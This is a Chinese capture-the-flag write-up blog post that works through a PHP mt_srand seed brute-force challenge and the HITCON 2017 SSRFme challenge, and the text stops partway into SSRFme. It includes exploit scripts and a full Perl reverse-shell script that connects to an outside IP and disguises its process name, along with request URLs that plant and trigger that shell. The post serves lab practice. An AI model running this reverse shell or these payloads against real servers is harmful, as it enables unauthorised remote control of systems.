<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="BUU Web 刷题笔记5"><meta name="keywords" content=""><meta name="author" content="m0nk3y"><meta name="copyright" content="m0nk3y"><title>BUU Web 刷题笔记5 | M0nk3y's Blog @ D0g3</title><link rel="shortcut icon" href="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201228205809.JPG"><link rel="stylesheet" href="/css/index.css?version=1.9.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.9.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.css"><script src="https://cdn.jsdelivr.net/npm/gitalk@latest/dist/gitalk.min.js"></script><script src="https://cdn.jsdelivr.net/npm/blueimp-md5@2.10.0/js/md5.min.js"></script><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  hexoVersion: '5.1.1'
} </script><meta name="generator" content="Hexo 5.1.1"><link rel="alternate" href="/atom.xml" title="M0nk3y's Blog @ D0g3" type="application/atom+xml">
</head><body><canvas class="fireworks"></canvas><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="Toggle article">Toggle site</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#GWCTF-2019-%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96"><span class="toc-number">1.</span> <span class="toc-text">[GWCTF 2019]枯燥的抽奖</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#HITCON-2017-SSRFme"><span class="toc-number">2.</span> <span class="toc-text">[HITCON 2017]SSRFme</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Comment"><span class="toc-number">3.</span> <span class="toc-text">[网鼎杯 2018]Comment</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#RoarCTF-2019-Online-Proxy"><span class="toc-number">4.</span> <span class="toc-text">[RoarCTF 2019]Online Proxy</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#NCTF2019-Fake-XML-cookbook"><span class="toc-number">5.</span> <span class="toc-text">[NCTF2019]Fake XML cookbook</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#RoarCTF-2019-Simple-Upload"><span class="toc-number">6.</span> <span class="toc-text">[RoarCTF 2019]Simple Upload</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#BSidesCF-2019-Kookie"><span class="toc-number">7.</span> <span class="toc-text">[BSidesCF 2019]Kookie</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#BSidesCF-2020-Had-a-bad-day"><span class="toc-number">8.</span> <span class="toc-text">[BSidesCF 2020]Had a bad day</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#BSidesCF-2019-Mixer"><span class="toc-number">9.</span> <span class="toc-text">[BSidesCF 2019]Mixer</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#BSidesCF-2020-Cards"><span class="toc-number">10.</span> <span class="toc-text">[BSidesCF 2020]Cards</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web5-CyberPunk"><span class="toc-number">11.</span> <span class="toc-text">[CISCN2019 华北赛区 Day1 Web5]CyberPunk</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201228205809.JPG"></div><div class="author-info__name text-center">m0nk3y</div><div class="author-info__description text-center"></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">57</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">52</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">Categories</span><span class="pull-right">9</span></a></div><hr><div class="author-info-links"><div class="author-info-links__title text-center">Links</div><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="https://www.google.com">Google</a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200825211012.jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">M0nk3y's Blog @ D0g3</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a><a class="site-page" href="/about">About</a><a class="site-page" href="/link">Friends</a><a class="site-page" href="/mytalk">说说</a></span><span class="pull-right"></span></div><div id="post-info"><div id="post-title">BUU Web 刷题笔记5</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-03-28</time><span class="post-meta__separator">|</span><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/Writeup/">Writeup</a><div class="post-meta-wordcount"><span>Word count: </span><span class="word-count">5.1k</span><span class="post-meta__separator">|</span><span>Reading time: 24 min</span></div></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><a id="more"></a>

<h1 id="GWCTF-2019-枯燥的抽奖"><a href="#GWCTF-2019-枯燥的抽奖" class="headerlink" title="[GWCTF 2019]枯燥的抽奖"></a>[GWCTF 2019]枯燥的抽奖</h1><ul>
<li>md_srand() 函数的伪随机性, 导致了 seed 种子可爆破</li>
</ul>
<p>打开题目, 查看源码, 发现了 check.php 访问后,得到题目的源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">z9GWK8zv2o</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#这不是抽奖程序的源代码！不许看！</span></span><br><span class="line">header(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">&#x27;seed&#x27;</span>]))&#123;</span><br><span class="line">$_SESSION[<span class="string">&#x27;seed&#x27;</span>]=rand(<span class="number">0</span>,<span class="number">999999999</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mt_srand($_SESSION[<span class="string">&#x27;seed&#x27;</span>]);</span><br><span class="line">$str_long1 = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;</span><br><span class="line">$str=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">$len1=<span class="number">20</span>;</span><br><span class="line"><span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $len1; $i++ )&#123;</span><br><span class="line">    $str.=substr($str_long1, mt_rand(<span class="number">0</span>, strlen($str_long1) - <span class="number">1</span>), <span class="number">1</span>);       </span><br><span class="line">&#125;</span><br><span class="line">$str_show = substr($str, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;p id=&#x27;p1&#x27;&gt;&quot;</span>.$str_show.<span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>($_POST[<span class="string">&#x27;num&#x27;</span>]===$str)&#123;x</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p id=flag&gt;抽奖，就是那么枯燥且无味，给你flag&#123;xxxxxxxxx&#125;&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p id=flag&gt;没抽中哦，再试试吧&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">show_source(<span class="string">&quot;check.php&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>要猜中全部的20位才能得到 flag, 题目已经给了前面10位, 并且刷新之后还是固定的,  只要符合  $_POST[‘num’]===$str 那么就成功了</p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3656#toc-3">https://xz.aliyun.com/t/3656#toc-3</a></p>
<p>下面这个爆破脚本应该是通用的: </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">str1 = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span></span><br><span class="line"><span class="comment"># 输入输出的值 str2</span></span><br><span class="line">str2 = <span class="string">&quot;z9GWK8zv2o&quot;</span></span><br><span class="line">str3 = str1[::<span class="number">-1</span>]</span><br><span class="line">length = len(str2)</span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(str2)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(len(str1)):</span><br><span class="line">        <span class="keyword">if</span> str2[i] == str1[j]:</span><br><span class="line">            res += str(j) + <span class="string">&#x27; &#x27;</span> + str(j) + <span class="string">&#x27; &#x27;</span> + <span class="string">&#x27;0&#x27;</span> + <span class="string">&#x27; &#x27;</span> + str(len(str1) - <span class="number">1</span>) + <span class="string">&#x27; &#x27;</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取 与 php_mt_seed-4.0 格式的数据, 然后拿进去爆破</span></span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure>



<p>爆破得到 seed : 757588651</p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200328112005.png"></p>
<p>带回原来的程序, 替换掉 </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">header(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line">mt_srand(<span class="number">757588651</span>);</span><br><span class="line">$str_long1 = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;</span><br><span class="line">$str = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">$len1 = <span class="number">20</span>;</span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; $len1; $i++) &#123;</span><br><span class="line">    $str .= substr($str_long1, mt_rand(<span class="number">0</span>, strlen($str_long1) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $str;</span><br><span class="line"><span class="comment">// z9GWK8zv2odZi5oV00dm</span></span><br></pre></td></tr></table></figure>

<p>输入, 得到flag</p>
<p>参考: <a target="_blank" rel="noopener" href="https://www.cnblogs.com/wangtanzhi/p/12288687.html">https://www.cnblogs.com/wangtanzhi/p/12288687.html</a> 这个王叹之 和另一个 师傅. 他们估计已经把buu 的web 刷完了??? 每次搜都能看到他们的博客, 真好~</p>
<h1 id="HITCON-2017-SSRFme"><a href="#HITCON-2017-SSRFme" class="headerlink" title="[HITCON 2017]SSRFme"></a>[HITCON 2017]SSRFme</h1><p>orange 大师傅出的题!</p>
<ul>
<li>CVE-2016-1238</li>
</ul>
<p><a target="_blank" rel="noopener" href="https://github.com/libwww-perl/URI/blob/b7680860f323a0cf3ffe5f6bdb684646e1ecac33/lib/URI.pm#L136">https://github.com/libwww-perl/URI/blob/b7680860f323a0cf3ffe5f6bdb684646e1ecac33/lib/URI.pm#L136</a></p>
<ul>
<li>perl 语法上设计逻辑导致的漏洞</li>
</ul>
<p><a target="_blank" rel="noopener" href="https://github.com/orangetw/My-CTF-Web-Challenges/tree/master#ssrfme">https://github.com/orangetw/My-CTF-Web-Challenges/tree/master#ssrfme</a></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_SERVER[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;</span><br><span class="line">        $http_x_headers = explode(<span class="string">&#x27;,&#x27;</span>, $_SERVER[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]);</span><br><span class="line">        $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] = $http_x_headers[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> $_SERVER[<span class="string">&quot;REMOTE_ADDR&quot;</span>];</span><br><span class="line"></span><br><span class="line">    $sandbox = <span class="string">&quot;sandbox/&quot;</span> . md5(<span class="string">&quot;orange&quot;</span> . $_SERVER[<span class="string">&quot;REMOTE_ADDR&quot;</span>]);</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    @chdir($sandbox);</span><br><span class="line"></span><br><span class="line">    $data = shell_exec(<span class="string">&quot;GET &quot;</span> . escapeshellarg($_GET[<span class="string">&quot;url&quot;</span>]));</span><br><span class="line">    $info = pathinfo($_GET[<span class="string">&quot;filename&quot;</span>]);</span><br><span class="line">    $dir  = str_replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;&quot;</span>, basename($info[<span class="string">&quot;dirname&quot;</span>]));</span><br><span class="line">    @mkdir($dir);</span><br><span class="line">    @chdir($dir);</span><br><span class="line">    @file_put_contents(basename($info[<span class="string">&quot;basename&quot;</span>]), $data);</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>

<p>注意这里 <code>$data = shell_exec(&quot;GET &quot; . escapeshellarg($_GET[&quot;url&quot;]));</code>  GET 后面有一个空格, 不知道有没有秒用.</p>
<p>escapeshellarg 这个函数之前也遇到过两三次了, 作用就是把传入的参数转换为linux下的可以执行命令并且安全的, 即通过添加<code>&#39;</code> </p>
<blockquote>
<p>知识点: 从上面的源码分析到, shell_exec 会执行我们通过url输入的内容将返回值给data,然后又通过file_put_contents函数来把执行的结果进行文件写入的操作</p>
<p>这里要预备的知识点是:  </p>
<p>GET  是Lib for WWW in Perl 中的命令, 当URL中的schema 是perl 中不存在的话,会执行eval导致命令执行</p>
</blockquote>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200328140007.png"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://330b6552-dc87-43a5-b016-4b387412eb67.node3.buuoj.cn/&#x27;</span></span><br><span class="line">exp = <span class="string">&#x27;/&#x27;</span></span><br><span class="line">payload = <span class="string">&quot;?url=&#123;&#125;&amp;filename=data&quot;</span></span><br><span class="line">see = <span class="string">&#x27;sandbox/5081e4434bea73288a7c7fc9d3427bbe/data&#x27;</span></span><br><span class="line">s = requests.Session()</span><br><span class="line">r = s.get(url + payload.format(exp))</span><br><span class="line">print(r.content)</span><br><span class="line">r = s.get(url + see)</span><br><span class="line">print(r.content)</span><br></pre></td></tr></table></figure>



<p>方法一: 利用Perl 反弹shell</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 原作者: https://momomoxiaoxi.com/2017/11/08/HITCON/</span></span><br><span class="line"><span class="comment">#!/usr/bin/perl -w</span></span><br><span class="line"><span class="comment"># perl-reverse-shell - A Reverse Shell implementation in PERL</span></span><br><span class="line"><span class="keyword">use</span> strict;</span><br><span class="line"><span class="keyword">use</span> Socket;</span><br><span class="line"><span class="keyword">use</span> FileHandle;</span><br><span class="line"><span class="keyword">use</span> POSIX;</span><br><span class="line"><span class="keyword">my</span> $VERSION = <span class="string">&quot;1.0&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Where to send the reverse shell.  Change these.</span></span><br><span class="line"><span class="keyword">my</span> $ip = <span class="string">&#x27;129.211.79.54&#x27;</span>; <span class="comment"># 改为服务器的ip</span></span><br><span class="line"><span class="keyword">my</span> $port = <span class="number">1234</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Options</span></span><br><span class="line"><span class="keyword">my</span> $daemon = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">my</span> $auth   = <span class="number">0</span>; <span class="comment"># 0 means authentication is disabled and any </span></span><br><span class="line">        <span class="comment"># source IP can access the reverse shell</span></span><br><span class="line"><span class="keyword">my</span> $authorised_client_pattern = <span class="string">qr(^127\.0\.0\.1$);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># Declarations</span></span><br><span class="line"><span class="string">my $global_page = &quot;&quot;;</span></span><br><span class="line"><span class="string">my $fake_process_name = &quot;/usr/sbin/apache&quot;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># Change the process name to be less conspicious</span></span><br><span class="line"><span class="string">$0 = &quot;[httpd]&quot;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># Authenticate based on source IP address if required</span></span><br><span class="line"><span class="string">if (defined($ENV&#123;&#x27;REMOTE_ADDR&#x27;&#125;)</span>) &#123;</span><br><span class="line">    cgiprint(<span class="string">&quot;Browser IP address appears to be: $ENV&#123;&#x27;REMOTE_ADDR&#x27;&#125;&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($auth) &#123;</span><br><span class="line">        <span class="keyword">unless</span> ($ENV&#123;<span class="string">&#x27;REMOTE_ADDR&#x27;</span>&#125; =~ $authorised_client_pattern) &#123;</span><br><span class="line">            cgiprint(<span class="string">&quot;ERROR: Your client isn&#x27;t authorised to view this page&quot;</span>);</span><br><span class="line">            cgiexit();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">elsif</span> ($auth) &#123;</span><br><span class="line">    cgiprint(<span class="string">&quot;ERROR: Authentication is enabled, but I couldn&#x27;t determine your IP address.  Denying access&quot;</span>);</span><br><span class="line">    cgiexit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Background and dissociate from parent process if required</span></span><br><span class="line"><span class="keyword">if</span> ($daemon) &#123;</span><br><span class="line">    <span class="keyword">my</span> $pid = <span class="keyword">fork</span>();</span><br><span class="line">    <span class="keyword">if</span> ($pid) &#123;</span><br><span class="line">        cgiexit(<span class="number">0</span>); <span class="comment"># parent exits</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    setsid();</span><br><span class="line">    <span class="keyword">chdir</span>(<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">    <span class="keyword">umask</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Make TCP connection for reverse shell</span></span><br><span class="line"><span class="keyword">socket</span>(SOCK, PF_INET, SOCK_STREAM, <span class="keyword">getprotobyname</span>(<span class="string">&#x27;tcp&#x27;</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">connect</span>(SOCK, sockaddr_in($port,inet_aton($ip)))) &#123;</span><br><span class="line">    cgiprint(<span class="string">&quot;Sent reverse shell to $ip:$port&quot;</span>);</span><br><span class="line">    cgiprintpage();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    cgiprint(<span class="string">&quot;Couldn&#x27;t open reverse shell to $ip:$port: $!&quot;</span>);</span><br><span class="line">    cgiexit();    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Redirect STDIN, STDOUT and STDERR to the TCP connection</span></span><br><span class="line"><span class="keyword">open</span>(STDIN, <span class="string">&quot;&gt;&amp;SOCK&quot;</span>);</span><br><span class="line"><span class="keyword">open</span>(STDOUT,<span class="string">&quot;&gt;&amp;SOCK&quot;</span>);</span><br><span class="line"><span class="keyword">open</span>(STDERR,<span class="string">&quot;&gt;&amp;SOCK&quot;</span>);</span><br><span class="line">$ENV&#123;<span class="string">&#x27;HISTFILE&#x27;</span>&#125; = <span class="string">&#x27;/dev/null&#x27;</span>;</span><br><span class="line"><span class="keyword">system</span>(<span class="string">&quot;w;uname -a;id;pwd&quot;</span>);</span><br><span class="line"><span class="keyword">exec</span>(&#123;<span class="string">&quot;/bin/sh&quot;</span>&#125; ($fake_process_name, <span class="string">&quot;-i&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment"># Wrapper around print</span></span><br><span class="line"><span class="function"><span class="keyword">sub</span> <span class="title">cgiprint</span> </span>&#123;</span><br><span class="line">    <span class="keyword">my</span> $line = <span class="keyword">shift</span>;</span><br><span class="line">    $line .= <span class="string">&quot;&lt;p&gt;\n&quot;</span>;</span><br><span class="line">    $global_page .= $line;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Wrapper around exit</span></span><br><span class="line"><span class="function"><span class="keyword">sub</span> <span class="title">cgiexit</span> </span>&#123;</span><br><span class="line">    cgiprintpage();</span><br><span class="line">    <span class="keyword">exit</span> <span class="number">0</span>; <span class="comment"># 0 to ensure we don&#x27;t give a 500 response.</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Form HTTP response using all the messages gathered by cgiprint so far</span></span><br><span class="line"><span class="function"><span class="keyword">sub</span> <span class="title">cgiprintpage</span> </span>&#123;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;Content-Length: &quot;</span> . <span class="keyword">length</span>($global_page) . <span class="string">&quot;\r</span></span><br><span class="line"><span class="string">Connection: close\r</span></span><br><span class="line"><span class="string">Content-Type: text\/html\r\n\r\n&quot;</span> . $global_page;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在服务器上保存为 shell.txt , 访问 <code>/?filename=URI/hacked.pm&amp;url=http://174.1.146.97/shell.txt</code> 这样就在网站上新建了一个URI目录,里面有hacked.pm 文件,文件为我们写入的shell.txt 用于反弹shell</p>
<p>然后再去访问执行以下: </p>
<p><code>?filename=xxx&amp;url=hack://174.1.146.97</code>就能获得一个反弹shell。这里访问<code>hack://174.1.146.97</code>时，hack是未定义模块，所以会自动搜索并加载URI中的hacked.pm 模块</p>
<p>而此时, 这个hacked.pm 就是我们写的shell.txt了, 就被题目靶机执行从而反弹shell</p>
<p>这里我走了这个流程, 但是用buuCTF 的内网靶机并没有反弹shell ,试一试自己的服务器</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Can&#39;t connect to 129.211.79.54:80</span><br><span class="line"></span><br><span class="line">Network is unreachable at &#x2F;usr&#x2F;share&#x2F;perl5&#x2F;LWP&#x2F;Protocol&#x2F;http.pm line 49.</span><br></pre></td></tr></table></figure>

<p>感觉还是要用内网靶机….</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE HTML PUBLIC &quot;-&#x2F;&#x2F;IETF&#x2F;&#x2F;DTD HTML 2.0&#x2F;&#x2F;EN&quot;&gt;</span><br><span class="line">&lt;html&gt;&lt;head&gt;</span><br><span class="line">&lt;title&gt;404 Not Found&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;&lt;body&gt;</span><br><span class="line">&lt;h1&gt;Not Found&lt;&#x2F;h1&gt;</span><br><span class="line">&lt;p&gt;The requested URL &#x2F;shell.txt was not found on this server.&lt;&#x2F;p&gt;</span><br><span class="line">&lt;hr&gt;</span><br><span class="line">&lt;address&gt;Apache&#x2F;2.4.18 (Ubuntu) Server at 174.1.146.97 Port 80&lt;&#x2F;address&gt;</span><br><span class="line">&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>然后在<code>/var/www/html</code> 目录下写一个shell.txt , 解决了 404 的问题, 但是还是没有反弹shell …</p>
<p>方法二2: 利用Perl 的 feture </p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200328144834.png"></p>
<p>将方法一上的exp 改为这里相对应了即可, 下面来讲讲原理: </p>
<p>新建一个 test.pl</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">open</span>(FD, <span class="string">&quot;whoami|&quot;</span>);</span><br><span class="line"><span class="keyword">print</span> &lt;FD&gt;;</span><br></pre></td></tr></table></figure>

